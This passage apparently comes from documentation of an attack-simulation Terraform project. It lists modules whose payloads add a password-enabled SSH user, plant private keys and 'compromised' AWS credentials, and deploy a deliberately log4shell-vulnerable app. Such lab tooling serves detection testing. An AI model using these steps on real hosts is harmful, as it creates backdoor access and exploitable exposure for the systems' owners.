$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125;&#46;&#46;&#46;&quot;<br/>    adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password &quot;$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125;&quot; &#124;&#124; log &quot;$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125; user already exists&quot;<br/>    mkdir &#45;p $&&#35;123;dirname&&#35;40;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;41;&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;41;&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;<br/>    chmod 600 $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;<br/>    chown $&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125;:$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;<br/>    log &quot;private key: $&&#35;40;ls &#45;l $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;&&#35;41;&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&&#35;95;payload&&#35;95;private = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;private&&#35;95;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload&&#35;95;private<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload&&#35;95;public = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;public&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;public = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;public&&#35;41;<br/>        base64&&#35;95;payload&&#35;95;private = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;private&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;private = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;private&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| attacker-deploy-ssh-user                                                   | ./modules/ssm/deploy-ssh-user                                  | ssm_deploy_ssh_user                        | context.aws.ssm.ssh_user                                                  | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "ssh_user": {<br/>                    "enabled": false,<br/>                    "password": null,<br/>                    "username": "lou.caloozer"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-user                                  | <pre>locals &&#35;123;<br/>    password = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;password&quot;&&#35;93;&&#35;41;,&quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;password&quot;&&#35;93; :  random&&#35;95;password&#46;password&#46;result<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;Setting up user: $&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125;&quot;<br/>    adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password $&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125; &#124;&#124; log &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125; user already exists&quot;<br/>    log &quot;Setting passwd: $&&#35;123;local&#46;password&&#35;125;&quot;<br/>    echo &&#35;x27;$&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125;:$&&#35;123;local&#46;password&&#35;125;&&#35;x27; &#124; chpasswd<br/>    log &quot;Adding user to allowed passwd auth in sshd&&#35;95;config&#46;d&quot;<br/>    cat &gt; /etc/ssh/sshd&&#35;95;config&#46;d/common&#45;user&#45;passwd&#45;auth&#46;conf &lt;&lt;&#45;EOF <br/>    &#35; Configuration to allow key authentication only and display a message on password attempt<br/>    Match User root,admin,test,guest,info,adm,mysql,user,administrator,oracle,ftp,pi,puppet,ansible,ec2&#45;user,vagrant<br/>        AuthenticationMethods publickey<br/>        PasswordAuthentication no<br/>        ForceCommand /bin/echo &&#35;x27;We talked about this guys&#46; No SSH for you&#33;&&#35;x27;<br/>    EOF<br/>    cat &gt; /etc/ssh/sshd&&#35;95;config&#46;d/custom&#45;user&#45;passwd&#45;auth&#46;conf &lt;&lt;&#45;EOF <br/>    Match User $&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125;<br/>        AuthenticationMethods publickey password<br/>        PasswordAuthentication yes<br/>    EOF<br/>    log &quot;Restarting ssh service&quot;<br/>    service ssh reload<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>        password = local&#46;password<br/>    &&#35;125;<br/>&&#35;125;<br/><br/>resource &quot;random&&#35;95;password&quot; &quot;password&quot; &&#35;123;<br/>  length           = 16<br/>  special          = true<br/>  override&&#35;95;special = &quot;&#33;&#35;$%&amp;&&#35;42;&&#35;40;&&#35;41;&#45;&&#35;95;=&#43;&&#35;91;&&#35;93;&&#35;123;&&#35;125;&lt;&gt;:?&quot;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| attacker-aws-credentials                                                   | ./modules/ssm/deploy-aws-credentials                           | ssm_deploy_secret_aws_credentials          | context.aws.ssm.aws_credentials                                           | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "aws_credentials": {<br/>                    "compromised_keys_user": null,<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-aws-credentials                           | <pre>locals &&#35;123;<br/>    tool = &quot;aws&quot;<br/>    aws&&#35;95;creds = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for u,k in var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;: &quot;$&&#35;123;k&#46;rendered&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Setting up aws cred environment variables&#46;&#46;&#46;&quot;<br/>    $&&#35;123;local&#46;aws&&#35;95;creds&&#35;125;<br/>    log &quot;Deploying aws credentials&#46;&#46;&#46;&quot;<br/>    mkdir &#45;p ~/&#46;aws<br/>    cat &lt;&lt;&#45;EOF &gt; ~/&#46;aws/credentials<br/>    &&#35;91;default&&#35;93;<br/>    aws&&#35;95;access&&#35;95;key&&#35;95;id=$AWS&&#35;95;ACCESS&&#35;95;KEY&&#35;95;ID<br/>    aws&&#35;95;secret&&#35;95;access&&#35;95;key=$AWS&&#35;95;SECRET&&#35;95;ACCESS&&#35;95;KEY<br/>    EOF<br/>    cat &lt;&lt;&#45;EOF &gt; ~/&#46;aws/config<br/>    &&#35;91;default&&#35;93;<br/>    region=$AWS&&#35;95;DEFAULT&&#35;95;REGION<br/>    output=json<br/>    EOF<br/>    log &quot;Running: aws get&#45;caller&#45;identity&quot;<br/>    aws sts get&#45;caller&#45;identity &#45;&#45;output json &gt;&gt; $LOGFILE 2&gt;&amp;1 <br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found &#45; waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found &#45; waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| attacker-vulnerable-docker-log4j-app                                       | ./modules/ssm/deploy-docker-log4j-app                          | ssm_deploy_docker_log4j_app                | context.aws.ssm.vulnerable.docker.log4j_app                               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "docker": {<br/>                        "log4j_app": {<br/>                            "enabled": false,<br/>                            "listen_port": 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker-log4j-app                          | <pre>locals &&#35;123;<br/>    image = &quot;ghcr&#46;io/christophetd/log4shell&#45;vulnerable&#45;app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929&quot;<br/>    name = &quot;log4shell&quot;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        if &&#35;91;&&#35;91; &&#35;96;sudo docker ps &#124; grep $&&#35;123;local&#46;name&&#35;125;&&#35;96; &&#35;93;&&#35;93;; then docker stop $&&#35;123;local&#46;name&&#35;125;; fi<br/>        log &quot;$&&#35;40;echo &&#35;x27;docker run &#45;d &#45;&#45;name $&&#35;123;local&#46;name&&#35;125; &#45;v /tmp:/tmp &#45;&#45;rm &#45;p $&&#35;123;local&#46;listen&&#35;95;port&&#35;125;:8080 $&&#35;123;local&#46;image&&#35;125;&&#35;x27;&&#35;41;&quot;<br/>        docker run &#45;d &#45;&#45;name $&&#35;123;local&#46;name&&#35;125; &#45;v /tmp:/tmp &#45;&#45;rm &#45;p $&&#35;123;local&#46;listen&&#35;95;port&&#35;125;:8080 $&&#35;123;local&#46;image&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        docker ps &#45;a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;curl&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;curl&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| attacker-vulnerable-log4j-app                                              | ./modules/ssm/deploy-log4j-app                                 | ssm_deploy_log4j_app                       | context.aws.ssm.vulnerable.log4j_app                                      | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "log4j_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8080<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-log4j-app                                 | <pre>locals &&#35;123;<br/>    app&&#35;95;dir = &quot;/vuln&#45;log4j&#45;app&quot;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;X quit<br/>    screen &#45;wipe<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;log4j&&#35;95;app&&#35;95;target&#46;log<br/>    <br/>    rm &#45;rf $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/>    mkdir $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/><br/>    log &quot;creating local files&#46;&#46;&#46;&quot;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;web&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; web&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;ldap&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip  &gt; ldap&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/><br/>    &#35; install java 8u131<br/>    log &quot;checking for jdk1&#46;8&#46;0&&#35;95;131&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &#33; &#45;d /usr/java/jdk1&#46;8&#46;0&&#35;95;131/ &&#35;93;; then<br/>        log &quot;jdk1&#46;8&#46;0&&#35;95;131 not found &#45; installing&#46;&#46;&#46;&quot;<br/>        wget &#45;c &#45;&#45;header &quot;Cookie: oraclelicense=accept&#45;securebackup&#45;cookie&quot; http://download&#46;oracle&#46;com/otn&#45;pub/java/jdk/8u131&#45;b11/d54c1d3a095b4ff2b6607d096fa80163/jdk&#45;8u131&#45;linux&#45;x64&#46;tar&#46;gz<br/>        mkdir &#45;p /usr/java<br/>        sudo tar &#45;xvzf jdk&#45;8u131&#45;linux&#45;x64&#46;tar&#46;gz &#45;C /usr/java<br/>    else<br/>        log &quot;jdk1&#46;8&#46;0&&#35;95;131 found &#45; skipping install&quot;<br/>    fi<br/>    <br/><br/>    &#35; update java path<br/>    log &quot;setting up java environment for build&#46;&#46;&#46;&quot;<br/>    export JAVA&&#35;95;HOME=/usr/java/jdk1&#46;8&#46;0&&#35;95;131/<br/>    sudo update&#45;alternatives &#45;&#45;install /usr/bin/java java $$&&#35;123;JAVA&&#35;95;HOME%&&#35;42;/&&#35;125;/bin/java 20000<br/>    sudo update&#45;alternatives &#45;&#45;install /usr/bin/javac javac $$&&#35;123;JAVA&&#35;95;HOME%&&#35;42;/&&#35;125;/bin/javac 20000<br/>    <br/>    java &#45;version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &#35; download gradle 7&#46;3&#46;1<br/>    log &quot;checking for gradle 7&#46;3&#46;1&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &#33; &#45;d /opt/gradle/gradle&#45;7&#46;3&#46;1 &&#35;93;; then<br/>        log &quot;gradle not found &#45; installing&#46;&#46;&#46;&quot;<br/>        wget https://services&#46;gradle&#46;org/distributions/gradle&#45;7&#46;3&#46;1&#45;bin&#46;zip<br/>        mkdir /opt/gradle<br/>        unzip &#45;d /opt/gradle gradle&#45;7&#46;3&#46;1&#45;bin&#46;zip<br/>    else<br/>        log &quot;gradle 7&#46;3&#46;1 found &#45; skipping install&quot; <br/>    fi<br/><br/>    &#35; update gradle path<br/>    log &quot;updating environment PATH to include gradle&#46;&#46;&#46;&quot;<br/>    export PATH=$PATH:/opt/gradle/gradle&#45;7&#46;3&#46;1/bin<br/>    gradle &#45;&#45;version 